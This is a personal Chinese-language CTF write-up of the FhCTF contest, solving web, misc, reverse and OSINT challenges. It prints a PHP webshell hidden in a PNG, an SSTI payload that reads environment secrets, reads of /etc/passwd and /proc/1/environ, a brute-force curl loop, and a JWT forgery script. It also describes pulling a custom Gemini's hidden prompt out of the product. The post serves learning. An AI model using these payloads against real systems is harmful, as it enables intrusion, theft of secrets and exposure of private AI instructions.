---
title: 11401FhCTF Writeup
date: 2026-01-09
categories:
  - 競賽
  - CTF
tags:
  - writeup
  - note
  - CTF
  - web
photos:
  - /img/FhCTF.webp
description: |-
  太陽殞落至昇起 三百六十五的三百七十四
  間隙以至太一處
  至高天之上 取同道以得十二無相
---

11401FhCTFWriteup
===
 

前言
---
這是我的第一次 CTF
雖然他已經快湊齊BadCTF Bingo了
 ~~但我還是打得很爛 writeup也寫得很爛~~
也是獲的了第12名 (一個人爆砍27題
還是值得紀念的
![Student-Team_Final_Leaderboard](https://hackmd.io/_uploads/Hy-w7keHbx.png)

Welcome
---

![image-1](https://hackmd.io/_uploads/SyYC7keHZx.png)
題目說已經給過了
開控制台檢查
![image](https://hackmd.io/_uploads/ByrZEkgS-e.png)
得到flag `FhCTF{S3n1ty_Ch3ck1ng....😝}`

Misc
---
### Christmas Tree
![image-2](https://hackmd.io/_uploads/HyMXVkeHZx.png)


查看檔案
**典型的霍夫曼樹結構(Huffman tree)**

```py
import json
import re
from pathlib import Path
from typing import Any, Optional


def is_leaf(node: Any) -> bool:
    """判斷是否為葉節點（可直接輸出字元/符號）。"""
    if node is None:
        return False
    if isinstance(node, str):
        return True
    if isinstance(node, (int, float)):
        return True
    if isinstance(node, dict):
        # 常見葉節點欄位：symbol/char/value（或你題目作者想到什麼就塞什麼）
        for k in ("symbol", "char", "value", "leaf", "data"):
            if k in node and not isinstance(node[k], (dict, list)):
                return True
    return False


def leaf_value(node: Any) -> str:
    """從葉節點取出要輸出的字元/符號。"""
    if isinstance(node, str):
        return node
    if isinstance(node, (int, float)):
        return str(node)
    if isinstance(node, dict):
        for k in ("symbol", "char", "value", "leaf", "data"):
            if k in node and not isinstance(node[k], (dict, list)):
                return str(node[k])
    # 真的取不到就暴力印出（通常不會走到這）
    return str(node)


def get_child(node: Any, bit: str) -> Optional[Any]:
    """
    取下一個節點。
    支援幾種常見 Huffman JSON 結構：
      1) {"0": left, "1": right}
      2) {"left": left, "right": right} 或 {"l":..., "r":...}
      3) {"children": [left, right]} 或 {"children": {"0":..., "1":...}}
    """
    if node is None:
        return None

    # 直接用 bit 當 key 的版本
    if isinstance(node, dict) and bit in node:
        return node[bit]

    if isinstance(node, dict):
        if bit == "0":
            for k in ("left", "l", "L"):
                if k in node:
                    return node[k]
        else:
            for k in ("right", "r", "R"):
                if k in node:
                    return node[k]

        if "children" in node:
            ch = node["children"]
            if isinstance(ch, list) and len(ch) >= 2:
                return ch[0] if bit == "0" else ch[1]
            if isinstance(ch, dict) and bit in ch:
                return ch[bit]

    # 有些人喜歡用 list 當節點： [left, right]
    if isinstance(node, list) and len(node) >= 2:
        return node[0] if bit == "0" else node[1]

    return None


def decode(bits: str, tree: Any) -> str:
    bits = re.sub(r"[^01]", "", bits)  # 去掉換行/空白/奇怪符號
    out = []
    cur = tree

    for i, b in enumerate(bits, 1):
        nxt = get_child(cur, b)
        if nxt is None:
            raise ValueError(f"走到不存在的分支：第 {i} 位元是 {b}，目前節點={cur!r}")

        cur = nxt
        if is_leaf(cur):
            out.append(leaf_value(cur))
            cur = tree  # 回到根節點繼續

    # 如果最後停在非根且非葉，代表 bits 可能被截斷
    return "".join(out)


def main():
    tree_path = Path("huffman_tree.json")
    bits_path = Path("encoded_gift.txt")

    tree = json.loads(tree_path.read_text(encoding="utf-8"))
    bits = bits_path.read_text(encoding="utf-8")

    msg = decode(bits, tree)
    print(msg)

    # 額外幫你挖 flag（有就印，沒有就算了）
    m = re.search(r"FhCTF\{[^}]+\}", msg)
    if m:
        print("\n[FLAG]", m.group(0))


if __name__ == "__main__":
    main()
```
得到flag `FhCTF{Hoffman_is_a_great_Christmas_tree}`
#
### 笑話大師
![image-3](https://hackmd.io/_uploads/r12UV1eHZl.png)


點開連結可看到一客製化的Gemini
![image-4](https://hackmd.io/_uploads/B1Z_VyxSbe.png)
原本我以為是普通的**prompt injection**，結果死活解不開
![image-5](https://hackmd.io/_uploads/H1BYVylBZx.png)


突然靈光一閃，既然這是個Gemine的客製化AI那在Gem裡面一定有**出題者設定的提示詞**
![image-6](https://hackmd.io/_uploads/SyusNklB-l.png)
建立副本
![image-7](https://hackmd.io/_uploads/HyW6NygBZl.png)

得到flag `FhCTF{thisi_Prompt_Injection}`
#
### 分享圖庫
![image-8](https://hackmd.io/_uploads/BJfkSyerZl.png)
**非常典型的php Webshell**
加上是給新手打的所以直接一套php木馬製作流程

```bash
convert -size 1x1 xc:white legit.png 
cp legit.png shell.png                                               
echo '<?php system($_GET["cmd"]); ?>' >> shell.png
```
然後裡面的偵測方式為==判斷文件頭==是否為png所以直接副檔名可以改php上傳
![image-9](https://hackmd.io/_uploads/BJqvSkgBZx.png)

訪問`/uploads/shell.php?cmd=printenv flag`(原始檔有寫flag在哪)
得到flag `FhCTF{png_format?Cannot_stop_php!}`


### Python Compile
![image-10](https://hackmd.io/_uploads/SySqHyxBbe.png)
![image-11](https://hackmd.io/_uploads/SJVoBJxSZx.png)
**很特別真的不會執行**
這題我卡了很久
發現不是普通的SSTI(服器端模板注入)

![image-12](https://hackmd.io/_uploads/SJI2IygrWx.png)

這行被我朋友發現如過修改成裡面擁有的檔案就能顯示其內容
這是對的思路
我一開始也有發現~~但被ai誤導~~
原本以為是flag.txt flag這種檔案結果不出來便被ai誤導成其他解題路線(畢竟是雜項

直到修改為`/etc/passwd`
![image-13](https://hackmd.io/_uploads/r10yPJgrbl.png)


成功用報錯輸出其內容

所以將其修改為`/proc/1/environ`
這載入容器時的環境變數存放的檔案

輸出
```python 
UV_TOOL_BIN_DIR=/usr/local/binHOSTNAME=54f86cd99223HOME=/rootUVICORN_APP=main:appGPG_KEY=7169605F62C751356D054A26A821E680E5FA6305PYTHON_SHA256=16ede7bb7cdbfa895d11b0642fa0e523f291e6487194d53cf6d3b338c3a17ea2PATH=/usr/local/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/binUVICORN_HOST=0.0.0.0PYTHON_VERSION=3.13.11UVICORN_PORT=8000PWD=/appFLAG=FhCTF{N0t_s4f3_t0_ou7put_th3_err0r_m5g}^
```
得到flag `FhCTF{N0t_s4f3_t0_ou7put_th3_err0r_m5g}`

### 分享圖庫 Revenge
分享圖庫的進階題

這我真不會解，檔案照樣可以上傳但他被只當成png來解讀
```
�PNG  IHDR%�V�PLTE������ pHYs���+ IDAT�c`�qd�IEND�B`�
```
又是我的朋友
他找到了一個~~超級搞笑~~的解法
![image-14](https://hackmd.io/_uploads/BknLD1grbe.png)
題目有漏洞（~~當然也可能是這麼設計的畢竟是雜項:)))~~
訪問容器的位置就全部輸出了
到現在還沒修應該就是這麼解的(上一個分享圖庫也能這麼解

Web
---
>web不全是我解的~~但我管他的我就愛寫~~(任性
>

### Welcome to Cybersecurity Jungle
![image-15](https://hackmd.io/_uploads/H1FRvkxSWx.png)
基於新手題與題目敘述先查看cookie
![image-16](https://hackmd.io/_uploads/SyaJ_yerbg.png)
cookie 名稱 `aXNGbGFnU2hvdzJ1` 進行 Base64 解碼：
解碼結果：`isFlagShow2u`

`44G144GJ44O844KL44GZ` Base64 解碼後得到日文假名：
解碼結果：ふぉーるす（是日文假名寫法的 false）
將日文假名的 true轉 Base64 後，得到：
`44Go44GF44KL44O8`
修改cookie後重整畫面即可得到flag
![image-17](https://hackmd.io/_uploads/S1xN_JlrZg.png)
~~(跟原本的一樣嗎沒關係他只是把flag顏色條成空白的~~
取得flag `FhCTF{Th3_e553nc3_of_pr0gramm1n6_is_ind3p3nden7_of_the_languag3_u53d}`

### INTERNAL LOGIN
![image](https://hackmd.io/_uploads/r1qztyeBbl.png)
最基礎的**SQLInjection**
![image](https://hackmd.io/_uploads/r1XRF1lHWx.png)
取得flag `FhCTF{SQL_1nj_42_Success}`
### The Visual Blind Spot
![image](https://hackmd.io/_uploads/Hk2koylHZg.png)
大致理解題意為需要輸入正確的RGB色調才會給flag
先看原始碼
![螢幕擷取畫面 2026-01-10 230521](https://hackmd.io/_uploads/r1Iwo1gS-l.png)
![螢幕擷取畫面 2026-01-10 230536](https://hackmd.io/_uploads/BkaDskxB-l.png)
兩處flag都是假的

找到關鍵函式
```js
const _secureStr = loadSystemParams();
```

也就是說：
真正被加密顯示在畫面上的文字，來自 **loadSystemParams()**
sys-config 元資料
```html
<div id="sys-config"
 data-params="249|351|240|291|249|408|288|387|369|192|330|366|324|240|186|375|351|192|375|414">
</div>
```
這串數字就是 明文來源（但被簡單編碼）
原始程式碼
```js
let charCode = (n / 3) - 13;
buffer += String.fromCharCode(charCode);
```
直接人工還原
將每個數字套用公式 (n / 3) - 13
得到字串
```
FhCTF{Stn3am_C1ph3p}
```
提一嘴另一解法
```js
window.onload = function() {
            const _base = parseInt("32", 16); 
            const _kMap = { 
                x: _base << 1,
                y: _base,
                z: _base << 2
            };
```
這是金鑰生成的方式
hex ==32==也就是50
偏移後得到100,50,200
![image](https://hackmd.io/_uploads/By4DlxerWe.png)

依序輸入就可以取得flag`FhCTF{Stn3am_C1ph3p}`
### Web Robots
![image](https://hackmd.io/_uploads/H1Y5gllrbe.png)
看到題目名稱就知道要去訪問`/robots.txt`
![image](https://hackmd.io/_uploads/ByvkWlgSbe.png)
看到有趣的網址`/secret`
![image](https://hackmd.io/_uploads/BJOwGleBWe.png)
嗯 自動導向一個什麼都沒有的網址`/secret/index.html`
直覺 ~~(通靈)~~ 告訴我一定在flag.txt
![image](https://hackmd.io/_uploads/SyoEmlxHZe.png)
取得flag `FhCTF{r0b075_4r3_n0t_v15ible_in_tx7}`
### Doors Open
![image](https://hackmd.io/_uploads/BkEdugeH-l.png)
點開寫著`The Door is OPEN!!!FIND THE DOOR`
![image](https://hackmd.io/_uploads/Bkr5dxgBbl.png)
查看原始碼
裡面寫提示看`robots`
![image](https://hackmd.io/_uploads/BJ_rFlgrbl.png)
訪問`doors`
![image](https://hackmd.io/_uploads/ByddYxxBWe.png)
出現開門動畫並提示並非正確的門
```js
 const door = document.getElementById('door');
    const messageEl = document.getElementById('message');
    const doorContainer = document.getElementById('doorContainer');
    
    let isOpening = false;

    doorContainer.addEventListener('click', async () => {
        if (isOpening) return;
        isOpening = true;

        // Start animation
        door.classList.add('open');

        // Wait 5 seconds
        await new Promise(r => setTimeout(r, 5000));

        // Fetch API
        try {
            const response = await fetch(`/api/doors/1`);
            const data = await response.json();
            
            if (data.correct) {
                messageEl.textContent = `正確！\n${data.message}`;
                messageEl.style.color = 'green';
            } else {
                messageEl.textContent = `錯誤！\n${data.message}`;
                messageEl.style.color = 'red';
            }
            messageEl.classList.remove('opacity-0');
        } catch (e) {
            console.error(e);
            messageEl.textContent = "發生錯誤";
            messageEl.classList.remove('opacity-0');
        }
    });
</script>
```
查看原始碼
網址顯示`/doors/1`
根據原始碼推論得知要尋找正確的門號
並且我可以直接訪問`api/door/XXX`以節省載入動畫的時間
其中門號**被限制**為5000
用腳本訪問0-5000
```bash=
BASE="https://15e47f56.fhctf.systems/api/doors"
seq 0 5000 | xargs -n1 -P50 -I{} sh -c '
  r=$(curl -s --max-time 5 "'"$BASE"'"/{} )
  echo "{} $r"
```
嗯 都沒有~~爛題~~ (誤
我摸了一下水晶球
訪問-1試試
```json
{"correct":true,"message":"這是正確的門！\nFlag: FhCTF{IDOR_get_the_s3cr3t_infom47i0n}"}
```
原來藏在無法訪問的最後一個
取得flag `FhCTF{IDOR_get_the_s3cr3t_infom47i0n}`
### Templating Danger
![image](https://hackmd.io/_uploads/rJ1mQbxHbg.png)
又是留言板(冷不丁的抖了一下
說實話我真的很不會注入
嘗試了一下payload
```js
{{7*7}}
<script>alert('XSS');</script>
```

![image](https://hackmd.io/_uploads/SkbiNZeHbx.png)

~~應該就是XSS~~(笑死我沒看原始檔好孩子不要學
實際上是SSIT~~這題我錯了兩得多小時~~
`{{7*7}}`不行是因為裡面有寫偵測`{}`的程式
所以改成Unicode編碼`\u007b`
```=
\u007b\u007b cycler.__init__.__globals__.os.environ.get('FLAG') \u007d\u007d
```
取得flag `FhCTF{T3mpl371ng_n33d_t0_b3_m0r3_c4r3full🥹}`
### Documents
![image](https://hackmd.io/_uploads/rkIQqbeS-e.png)
![image](https://hackmd.io/_uploads/Sk6M9ZeHZl.png)
提示說http標頭已經告訴我的一切(~~那是什麼~~
由於後端使用`FastAPI`先嘗試存取其預設`OpenAPI`文件以了解實際路由配置
訪問`/openapi.json`
![image](https://hackmd.io/_uploads/BkQ45zxBbl.png)
看到有趣的路徑
![image](https://hackmd.io/_uploads/Sy6plflrbx.png)
嗯 他耍我(~~欠扁~~
重看一次`/openapi.json`
```json
"/flag.html": {
      "get": {
        "summary": "Flag Question Mark Page",
        "operationId": "flag_question_mark_page_flag_html_get",
        "parameters": [
          {
            "name": "referer",
            "in": "header",
            "required": false,
            "schema": {
              "anyOf": [
                {
                  "type": "string"
                },
                {
                  "type": "null"
                }
              ],
              "description": "Referer Checker\nWe will check you whether coming from localhost.app:8000/index.html, with secure HTTP protocol.",
              "title": "Referer"
            },
            "description": "Referer Checker\nWe will check you whether coming from localhost.app:8000/index.html, with secure HTTP protocol."
          }
        ],
        "responses": {
          "200": {
            "description": "Successful Response",
            "content": {
              "application/json": {
                "schema": {

                }
              }
            }
          }
```
發現關鍵
```
"description": "Referer Checker\nWe will check you whether coming from localhost.app:8000/index.html, with secure HTTP protocol."
```
合理推測要Referer改為`localhost.app:8000/index.html`

![image](https://hackmd.io/_uploads/rJ_KoGer-l.png)

取得flag `FhCTF{URL_encod3d_m337_p47h_d15cl0sure😱😱}`
### SYSTEM ROOT SHELL
![image](https://hackmd.io/_uploads/HkO2izlHWl.png)
熟悉的問題(在台科社課看過
![image](https://hackmd.io/_uploads/Skt7hzxBZg.png)
我還以為要在系統裡找flag
結果似乎被設定成只要普通的判斷式而非真實運行的指令
~~(看來主辦方很怕~~
取得flag `FhCTF{RCE_Success_v3}`
### LOG ACCESS
![image](https://hackmd.io/_uploads/SyeG6MxH-g.png)
跟上題很像是一種判斷式的路徑穿透題
![image](https://hackmd.io/_uploads/HJSRTMlr-g.png)
~~(我通靈出來的~~
```C++=
       function access() {
            const input = document.getElementById('p_in').value;
            const output = document.getElementById('v_out');

            const _h = [70, 104, 67, 84, 70].map(c => String.fromCharCode(c)).join('');
            

            const _c1 = "\x50\x61\x74\x68\x5f"; 
            const _c2 = (21337 >> 4).toString(16); 
            const _c3 = "\x54\x72\x34\x76";

            const check1 = input.split('.').length > 3;
            const check2 = input.toLowerCase().indexOf('flag') !== -1;

            if (check1 && check2) {
                const final = _h + "{" + _c1 + _c3 + "_" + _c2 + "}";
                output.innerText = "ACCESS_GRANTED:\n" + final;
                output.className = "bg-black p-4 border border-green-500 h-32 overflow-auto text-xs text-green-500 font-bold";
            } else {
                output.innerText = "ACCESS_DENIED: Path traversal attempt detected or invalid path.";
                output.className = "bg-black p-4 border border-red-900 h-32 overflow-auto text-xs text-red-800";
            }
```
```C=
const check1 = input.split('.').length > 3;
const check2 = input.toLowerCase().indexOf('flag') !== -1;
```
第一行是判斷`.`是否大於3個
第二行是判斷輸入字串是否含有`flag`
只要條件滿足就會輸出flag(甚是flag...也行:)))
然後flag其實也寫在裡面
```C=
const _h = [70, 104, 67, 84, 70].map(c => String.fromCharCode(c)).join('');
const _c1 = "\x50\x61\x74\x68\x5f"; 
const _c2 = (21337 >> 4).toString(16); 
const _c3 = "\x54\x72\x34\x76";
```
這四個值解出來分別為`FhCTF` `Path_` `535` `Tr4v`
根據這行
```C=
const final = _h + "{" + _c1 + _c3 + "_" + _c2 + "}"
```
也可得知flag為`FhCTF{Path_Tr4v_535}`
## KID
![image](https://hackmd.io/_uploads/S1xJQmxHZe.png)
![image](https://hackmd.io/_uploads/H1A4m7lSbg.png)
一開始並沒有`cookie`
![image](https://hackmd.io/_uploads/HJJP7QgHbx.png)
取的通行證後發現`cookie`為`JWT`格式(嘔 這不純潔
```
eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiIsImtpZCI6ImRlZmF1bHQucGVtIn0.eyJ1c2VyIjoiZ3Vlc3RfdXNlciIsInJvbGUiOiJndWVzdCJ9.S4-YIB8_-sXb1sLJAkoDPr1HHEO7r8E4DPjFkxi3vJyYDlHiJKFEkw3L7X0yBOvxuBJ-PMXhPIgc1I9phkNX9w9cLEMUDZtsdqVh1BMhux-H8g0S9HHaQ3ZFcMb_f9WZpgdM1RQ-i-dlCxxzsHus2E13sJc2ITHASsw4xJz-wtdaN_ME3EF_conBM_P5mF_fM3GT-7zvfiUtcu845FREG6BZY_Z7ji_S6A8R0jN200ziB4s9qkd2TnxAuiCAtANV9MnPJZYFibwZOQspXf3cGcyCeO307yiQNljQfZlxWGRt8f3V1rlXa2UXx2rEnB_85wRQbMmPchvm9p7nN8O_cA
```
有提到可以允許`HS256`格式
`JWT`解碼如下：
```json
{
  "typ": "JWT",
  "alg": "RS256",
  "kid": "default.pem"
}
{
  "user": "guest_user",
  "role": "guest"
}
```
經典的**JWT Algorithm Confusion**風險
其實我這題我解很久(~~被線上JWT坑的~~
```python=
import jwt

SECRET = ""
headers = {
    "typ": "JWT",
    "alg": "HS256",
    "kid": "/dev/null"
}
payload = {
    "user": "admin_user",
    "role": "admin"
}
token = jwt.encode(payload, SECRET, algorithm="HS256", headers=headers)
print(token)
```
使用者可控制 `kid`
`kid` 決定驗簽金鑰來源
`fallback` 至 `HS256`
驗簽時使用 `/dev/null` → 空 `key`
則只要攻擊者在簽署 `JWT` 時：
```
HMAC-SHA256(secret="", message="header.payload")
```
而伺服器驗簽時 也使用同一個空`secret`則：
```
signature_attack == signature_server
```
驗簽必然通過
![image](https://hackmd.io/_uploads/rJV_LQxr-x.png)
取得flag `FhCTF{Th3_k1d_u53d_JWT_t0_tr4v3rs3_p4th5}`
### Something You Put Into
![image](https://hackmd.io/_uploads/BJrJPXxBWe.png)
其實跟上一題一樣是JWT的問題
但其實我不會正規解法
雖然很丟臉但我在電腦前做了1個小時還是解不開
結果題目的檔案有問題

**他把flag直接放在裡面了**
![image](https://hackmd.io/_uploads/Hy_0PmxSZe.png)
~~嘻嘻我有存~~
(它晚上被緊急?下架了
取得flag `FhCTF{🐷B3_c4r3ful_y0ur_SQL_synt4x🐷}`

Reverse
---
### OBF 
![image](https://hackmd.io/_uploads/SkDIFQgrbx.png)
給了一個py加密程式還有txt檔
```
3e08772c224960093145070318575a0e741e050c7a2d745a1b6f5a0d5834322b
```
應為被加密的密文(好奇怪為甚麼不是Crypto題
~~反正我Crypto一題都沒解出來~~
~反正我是不懂admin的sha1為甚麼會等於61cfc9d3dadc5504391b872d170bbe73f6ca0d77~
說回正題腳本是用狀態機（以字串位址為 key 的函式表）分段填滿 `memory[0..63]`，組出一把 `64 bytes` 的 `_key`，再拿 `_key` 對 `flag` 做 `XOR` 加密，最後把結果輸出成 `hex`

因此，只要依照程式邏輯還原 `_key`，再用 `output.txt` 反 `XOR`，就能得到 `flag`
解密後得`FhCTF{08fu5c471n6_Py7h0n_15_fun}`
### The Lock
![image](https://hackmd.io/_uploads/SJlWmExr-x.png)
給一個exe執行檔
在ida中逆向
![image](https://hackmd.io/_uploads/B1oxLVxBZl.png)
找到有趣的地方
![image](https://hackmd.io/_uploads/rkqLLExSZl.png)
`check_password` 會先以 `substr(6, len-7)` 取出 `{}` 中的字串 `inner`，並限制其長度為 26。
接著程式宣告兩個常數陣列：`key[4]` 與 `expected[26]`。
依規則寫腳本
```python=
key = [85, 51, 102, 17]
expected = [7,2,20,40,47,74,97,92,32,111,21,54,83,26,113,129,132,127,37,116,140,106,101,126,87,54]
inner = ''.join(chr((expected[i] - 2*i) ^ key[i % 4]) for i in range(26))
flag = f"FhCTF{{{inner}}}"
print(flag)
```
取得flag `FhCTF{R3v3rs3_Eng1n33r1ng_1s_Ar7}`

OSINT
----
~~接下來就是通靈題啦~~
~說實話我覺得很沒參考價值可以跳過不用看~
### Trace the Landmark
![image](https://hackmd.io/_uploads/rk2GdEeHbe.png)
![photo-3](https://hackmd.io/_uploads/S11HOElBWg.jpg)
題目給到的是羅馬萬神殿
這題屬於是格式寫起來很麻煩了
取得flag`FhCTF{Piazza_della_Rotonda_00186_Roma_RM_Italy}`
~不得不說每題格式講的有夠不清楚~
### 島 1
![image](https://hackmd.io/_uploads/B1Pi9EeSWe.png)
這題我看到是直接傻眼的
![land-1](https://hackmd.io/_uploads/SktY54xHZx.png)
餐廳的字也被馬掉只能隱約看到`新` `口餐廳`
超鳥誰知道
但開google以圖搜圖還真搜到了
![image](https://hackmd.io/_uploads/B1Et34eHbl.png)
(~~寫到這的時候還沒吃東西看的我好餓~~
特色菜應該就是在地美食了
一個一個爆破
### The FH Gift

![image](https://hackmd.io/_uploads/Syw2ZHxSbx.png)
郵件為`multipart/mixed`附`base64`值
將`base64` 解碼得到`PK`開頭
判定為 ZIP（檔頭 PK\x03\x04）
解壓縮得到 flag.txt
讀出後得到flag `FhCTF{M1M3_Typ3s_C4n_B3_D3c3pt1v3}`
### 沒戴安全帽的騎士
![image](https://hackmd.io/_uploads/H1IufBxHZx.png)
通靈題直接問AI
![rider_without_helmet](https://hackmd.io/_uploads/BJVczreBZe.png)
